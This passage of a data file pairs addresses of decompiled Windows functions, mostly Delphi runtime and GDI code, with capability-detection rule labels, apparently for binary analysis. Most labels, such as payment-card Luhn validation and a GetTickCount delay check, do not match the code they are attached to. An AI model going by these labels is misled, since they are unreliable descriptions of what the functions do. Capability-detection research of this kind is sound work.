*in_FS_OFFSET = &stack0xffffffb4;\n        arg_8h_00 = var_11h;\n        puStack68 = &stack0xfffffffc;\n        fcn.00422188(arg_8h_00, arg_ch_00);\n        *in_FS_OFFSET = arg_8h_00;\n        uStack76 = 0x42245e;\n        fcn.00421804();\n        return;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x42249e;\n    uStack40 = 0x422496;\n    fcn.00421804();\n    return;\n}\n",
        "token_count": 575
    },
    "004224a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004224a4(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x4225bb;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x4224e1;\n    fcn.00421804();\n    uStack84 = 0x422596;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    cVar1 = fcn.00421d70();\n    if (cVar1 != '\\0') {\n        fcn.00422384(arg_8h);\n        fcn.00405620();\n        if (-1 < var_24h + -1) {\n            do {\n                var_ch = var_20h + 1;\n                fcn.004059dc(&fcn.004224a4::var_ch, 0, 0, 0, 0);\n                iVar2 = sub.advapi32.dll_RegEnumValueA();\n                if (iVar2 == 0) {\n                    arg_8h_00 = arg_8h;\n                    fcn.004059dc();\n                    fcn.00405728();\n                    fcn.00422384(arg_8h_00);\n                }\n                var_24h = var_24h + -1;\n            } while (var_24h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x42259d;\n    uStack84 = 0x422595;\n    fcn.00421804();\n    return;\n}\n",
        "token_count": 514
    },
    "004238c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004238c0(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((in_EAX != 0) && (in_EAX != *0x4999fc)) {\n        sub.gdi32.dll_DeleteObject();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "004239bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004239bc(ushort param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    ushort extraout_CX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_CX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x20) = param_1;\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "00423a1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00423a1c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "00423a28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00423a28(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "00423bdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423bdc(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x423bf5;\n    fcn.00423a1c();\n    uStack32 = 0x423c45;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = *(param_2 + 0x10);\n    puStack28 = &stack0xfffffffc;\n    iVar2 = fcn.00423a34();\n    *(param_2 + 0x10) = iVar2;\n    if (iVar1 != iVar2) {\n        fcn.0040484c();\n    }\n    fcn.00423b18();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x423c4c;\n    uStack32 = 0x423c44;\n    fcn.00423a28();\n    return;\n}\n",
        "token_count": 265
    },
    "00423d44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00423d44(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    puStack24 = 0x423d5b;\n    iVar1 = fcn.00419c08();\n    uStack28 = 0x423de1;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    while (var_4h < *(iVar1 + 8)) {\n        fcn.00419898();\n        fcn.004253d0();\n        var_4h = var_4h + 1;\n        fcn.00425738();\n    }\n    fcn.00423cd4();\n    fcn.00423cd4();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x423de8;\n    if (-1 < var_4h + -1) {\n        do {\n            uStack28 = 0x423dcd;\n            fcn.00419898();\n            uStack28 = 0x423dd2;\n            fcn.00425608();\n            var_4h = var_4h + -1;\n        } while (var_4h != 0);\n    }\n    uStack28 = 0x423de0;\n    fcn.00419c6c();\n    return;\n}\n",
        "token_count": 350
    },
    "00424528": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00424528(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    *0x491b88 = 0;\n    uVar1 = fcn.00423a34();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 0xff000008;\n    *(in_EAX + 0x1c) = *0x499a04;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 207
    },
    "004245c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004245c0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x4245db;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x4245eb;\n        fcn.00424274();\n        uStack24 = 0x42467b;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x424603;\n        puStack20 = &stack0xfffffffc;\n        fcn.00424274();\n        uStack36 = 0x42465e;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.00423c58();\n        fcn.004246fc();\n        if (*(in_EAX + 0x1c) != *(param_2 + 0x1c)) {\n            fcn.00424a40();\n            fcn.00424a5c();\n        }\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x424665;\n        uStack36 = 0x42465d;\n        fcn.00424284();\n        return;\n    }\n    puStack20 = 0x42468d;\n    fcn.00419e40();\n    return;\n}\n",
        "token_count": 399
    },
    "00424978": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424978(void)\n\n{\n    fcn.00424468();\n    fcn.004246ac();\n    return;\n}\n",
        "token_count": 31
    },
    "004249a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004249a4(void)\n\n{\n    fcn.00424694();\n    fcn.004246ac();\n    return;\n}\n",
        "token_count": 32
    },
    "00424a88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424a88(uint param_1, uchar param_2)\n\n{\n    fcn.00424694(param_2);\n    fcn.004246ac();\n    return;\n}\n",
        "token_count": 45
    },
    "00424b44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00424b44(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00423a34();\n    *(in_EAX + 0x10) = uVar1;\n    *(in_EAX + 0x18) = 4;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 174
    },
    "00424bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424bb0(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x424bcb;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x424bdb;\n        fcn.00424274();\n        uStack24 = 0x424c50;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x424bf3;\n        puStack20 = &stack0xfffffffc;\n        fcn.00424274();\n        uStack36 = 0x424c33;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.00423c58();\n        fcn.00424d98();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x424c3a;\n        uStack36 = 0x424c32;\n        fcn.00424284();\n        return;\n    }\n    puStack20 = 0x424c62;\n    fcn.00419e40();\n    return;\n}\n",
        "token_count": 335
    },
    "00424cd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424cd8(void)\n\n{\n    fcn.00424c68();\n    fcn.00424c80();\n    return;\n}\n",
        "token_count": 34
    },
    "00424e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00424e10(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00423a34();\n    *(in_EAX + 0x10) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 159
    },
    "00424e78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00424e78(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x424e93;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        puStack20 = 0x424e9f;\n        fcn.00424274();\n        uStack24 = 0x424f08;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack32 = 0x424eb7;\n        puStack20 = &stack0xfffffffc;\n        fcn.00424274();\n        uStack36 = 0x424eeb;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        fcn.00423c58();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x424ef2;\n        uStack36 = 0x424eea;\n        fcn.00424284();\n        return;\n    }\n    puStack20 = 0x424f1a;\n    fcn.00419e40();\n    return;\n}\n",
        "token_count": 327
    },
    "00424f8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00424f8c(uint param_1, uint param_2)\n\n{\n    fcn.00424f3c(*0x491e10, *0x491e14, param_2, *0x491e1c);\n    return;\n}\n",
        "token_count": 62
    },
    "00425108": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00425108(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    sub.kernel32.dll_InitializeCriticalSection();\n    iVar1 = fcn.00424528();\n    *(in_EAX + 0xc) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x425968;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.00424b44();\n    *(in_EAX + 0x10) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x425988;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.00424e10();\n    *(in_EAX + 0x14) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4259a8;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    *(in_EAX + 0x20) = 0xcc0020;\n    *(in_EAX + 8) = *0x4251c8;\n    fcn.00419b80();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 0x38;\n    }\n    return in_EAX;\n}\n",
        "token_count": 421
    },
    "004252b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004252b0(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *arg_8h_00;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (arg_8h != NULL) {\n        cVar1 = (**(*arg_8h + 0x1c))();\n        if (cVar1 == '\\0') {\n            (**(*in_EAX + 0x10))();\n            fcn.004257f0();\n            fcn.00424fb0();\n            uVar2 = fcn.00424230();\n            sub.gdi32.dll_SetBkColor(in_EAX[1], uVar2);\n            uVar2 = fcn.00424230();\n            sub.gdi32.dll_SetTextColor(in_EAX[1], uVar2);\n            iVar3 = (**(*arg_8h + 0x20))();\n            iVar3 = iVar3 + var_4h;\n            arg_8h_00 = &var_14h;\n            (**(*arg_8h + 0x2c))();\n            fcn.00418448(arg_8h_00, iVar3);\n            (**(*arg_8h + 0x14))();\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "00425570": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00425570(void)\n\n{\n    ulong uStack16;\n    \n    fcn.00425528();\n    return uStack16;\n}\n",
        "token_count": 33
    },
    "0042558c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0042558c(void)\n\n{\n    uint uStack12;\n    \n    fcn.00425528();\n    return CONCAT44(uStack12, uStack12);\n}\n",
        "token_count": 40
    },
    "00425680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425680(uint param_1, uint *param_2)\n\n{\n    fcn.004253f8(*param_2, param_2[1]);\n    return;\n}\n",
        "token_count": 45
    },
    "0042579c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042579c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack16;\n    uint uStack12;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (*(in_EAX + 4) != 0) {\n            fcn.00425738();\n            fcn.00425658();\n            *(in_EAX + 0x18) = uStack16;\n            *(in_EAX + 0x1c) = uStack12;\n            *(in_EAX + 4) = 0;\n            *(in_EAX + 8) = *(in_EAX + 8) & 0xfe;\n        }\n        if (param_2 != 0) {\n            *(in_EAX + 8) = *(in_EAX + 8) | 1;\n            *(in_EAX + 4) = param_2;\n            fcn.00425680();\n        }\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "00425a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00425a70(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffecc;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_104h;\n    uint var_100h;\n    \n    puStack272 = &stack0xfffffffc;\n    uStack276 = 0x425b0c;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack280;\n    iVar1 = sub.kernel32.dll_GetLastError_1();\n    if (iVar1 != 0) {\n        in_stack_fffffecc = 0x1000;\n        iVar1 = sub.kernel32.dll_FormatMessageA(0x1000, 0, iVar1, 0x400, &var_100h, 0x100, 0);\n        if (iVar1 != 0) {\n            fcn.004057a0();\n            fcn.0040dafc();\n            fcn.00404ec4();\n            goto code_r0x00425af3;\n        }\n    }\n    fcn.00425a1c();\ncode_r0x00425af3:\n    *in_FS_OFFSET = in_stack_fffffecc;\n    fcn.00405530(0x425b13);\n    return;\n}\n",
        "token_count": 295
    },
    "00425ca8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00425ca8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return (in_EAX * param_2 + (param_1 - 1U) & ~(param_1 - 1U)) / 8;\n}\n",
        "token_count": 72
    },
    "00425f90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425f90(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = *param_2 + -1;\n    if (0 < iVar4) {\n        iVar3 = 1;\n        do {\n            puVar1 = in_EAX + iVar3 * 4;\n            puVar2 = in_EAX + iVar3 * 3;\n            puVar2[2] = puVar1[2];\n            puVar2[1] = puVar1[1];\n            *puVar2 = *puVar1;\n            iVar3 = iVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    if (*param_2 < 0x100) {\n        fcn.00403af4();\n        *param_2 = 0x100;\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "00426060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426060(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffbb8;\n    uint var_424h;\n    uint var_420h;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uint uStack1044;\n    uint var_408h;\n    uchar var_404h [28];\n    int32_t lppe;\n    uint var_3e4h;\n    uchar auStack996 [988];\n    uint hdc;\n    \n    uStack1044 = 0x42608c;\n    fcn.004030fc();\n    uStack1044 = 0;\n    puStack1048 = 0x426093;\n    hdc = sub.user32.dll_GetDC();\n    uStack1052 = 0x42615d;\n    uStack1056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbe0;\n    puStack1048 = &stack0xfffffffc;\n    iVar1 = sub.gdi32.dll_GetDeviceCaps();\n    if (0xf < iVar1) {\n        sub.gdi32.dll_GetSystemPaletteEntries(hdc, 0, 8, &stack0xfffffbf8);\n        in_stack_fffffbb8 = hdc;\n        if (lppe == 0xc0c0c0) {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 1, &fcn.00426060::lppe);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -7, 7, &stack0xfffffc1c);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, 7, 1, &fcn.00426060::var_3e4h);\n        }\n        else {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 8, &fcn.00426060::var_3e4h);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffbb8;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x426164);\n    return;\n}\n",
        "token_count": 472
    },
    "004264d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004264d4(int32_t arg_8h)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint8_t *in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = *in_EDX - **(arg_8h + 8);\n    uVar5 = in_EDX[1] - *(*(arg_8h + 8) + 4);\n    uVar6 = *in_EAX - **(arg_8h + 8);\n    uVar1 = in_EAX[1] - *(*(arg_8h + 8) + 4);\n    if ((((uVar6 ^ uVar6 >> 0x1f) - (uVar6 >> 0x1f) < (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f)) ||\n        (((0 < uVar4 && (uVar6 < uVar4)) ||\n         (iVar2 = (uVar1 ^ uVar1 >> 0x1f) - (uVar1 >> 0x1f),  iVar2 < (uVar5 ^ uVar5 >> 0x1f) - (uVar5 >> 0x1f))))) ||\n       ((0 < uVar5 && (uVar1 < uVar5)))) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = CONCAT31(iVar2 >> 8, 1);\n    }\n    return uVar3;\n}\n",
        "token_count": 388
    },
    "00426870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint16_t fcn.00426870(void)\n\n{\n    uint16_t *in_EAX;\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    \n    uVar2 = 0;\n    puVar1 = in_EAX + 10;\n    for (; in_EAX < puVar1; in_EAX = in_EAX + 1) {\n        uVar2 = uVar2 ^ *in_EAX;\n    }\n    return uVar2;\n}\n",
        "token_count": 106
    },
    "0042696c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042696c(uint arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t *in_EDX;\n    uint var_28h;\n    uint var_1ah;\n    uint var_14h;\n    int32_t var_8h;\n    \n    fcn.00426888();\n    if (var_1ah < 9) {\n        if (var_8h == 0) {\n            *in_EDX = (1 << (var_1ah & 0x1f)) * 4 + 0x28;\n        }\n        else {\n            *in_EDX = var_8h * 4 + 0x28;\n        }\n    }\n    else {\n        *in_EDX = 0x28;\n        if ((var_1ah._2_1_ & 3) != 0) {\n            *in_EDX = *in_EDX + 0xc;\n        }\n    }\n    *in_ECX = var_14h;\n    return;\n}\n",
        "token_count": 234
    },
    "00426cb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00426cb4(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 128
    },
    "00426d5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426d5c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(*in_EAX + 0x44);\n    fcn.00426d04(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 103
    },
    "00427110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00427110(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00404620();\n    *(in_EAX + 4) = uVar1;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 8) = uVar1;\n    fcn.004271bc();\n    fcn.004271bc();\n    fcn.004271bc();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 205
    },
    "004271bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004271bc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4271d7;\n    fcn.00419740();\n    uStack32 = 0x427200;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00419740();\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 139
    },
    "00427410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427410(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42742c;\n    iVar1 = fcn.00427224();\n    if (iVar1 == 0) {\n        puStack28 = 0x42743c;\n        fcn.004259e0();\n    }\n    puStack28 = 0x427443;\n    piVar2 = (**(iVar1 + 0x48))();\n    uStack32 = 0x427487;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piVar2[7] = in_EAX;\n    puStack28 = &stack0xfffffffc;\n    iVar1 = fcn.00404864();\n    piVar2[6] = iVar1;\n    (**(*piVar2 + 0x5c))();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x4274a6;\n    fcn.00404650();\n    *(in_EAX + 0xc) = piVar2;\n    piVar2[5] = in_EAX;\n    uStack32 = 0x4274ba;\n    iVar1 = fcn.00404864();\n    piVar2[4] = iVar1;\n    uStack32 = 0x4274ca;\n    fcn.0040484c();\n    return;\n}\n",
        "token_count": 375
    },
    "004277dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
